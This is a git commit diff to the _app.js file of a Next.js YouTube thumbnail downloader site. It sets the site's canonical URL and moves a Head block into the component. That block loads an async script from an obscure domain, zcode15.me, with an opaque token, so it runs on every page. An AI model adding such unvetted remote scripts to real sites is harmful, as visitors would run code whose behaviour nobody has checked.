d969479de14bcb4e493c8c697b3aefd2b1a58de3
abdelali <abbouchiabdelali02@gmail.com>
2023-10-15 21:37:15 +0200

    new

--- pages/_app.js
+++ pages/_app.js
@@ -1,6 +1,7 @@
 import "../styles/index.css";
 import { Fragment } from "react";
 import { DefaultSeo } from "next-seo";
+import Head from 'next/head'; // Import Head from next/head
 
 function MyApp({ Component, pageProps }) {
   return (
@@ -8,24 +9,24 @@ function MyApp({ Component, pageProps }) {
       <DefaultSeo
         title="Youtube Thumbnail Downloader"
         description="Download high-quality thumbnails from YouTube videos."
-        canonical="https://your-website-url.com"
+        canonical="https://get-youtubethumbnail.com"
         openGraph={{
-          url: "https://your-website-url.com",
+          url: "https://get-youtubethumbnail.com",
           title: "Youtube Thumbnail Downloader",
           description: "Download high-quality thumbnails from YouTube videos.",
           site_name: "Youtube Thumbnail Downloader",
         }}
       />
-      <Component {...pageProps} />
-    </Fragment>
-  );
-}
-<Head>
+      <Head> {/* Head component should be inside Fragment */}
         <script
           type="text/javascript"
           src="https://zcode15.me/?ze=my3dcmbrmi5ha3ddf42dsnbq"
           async
         />
       </Head>
+      <Component {...pageProps} />
+    </Fragment>
+  );
+}
 
 export default MyApp;
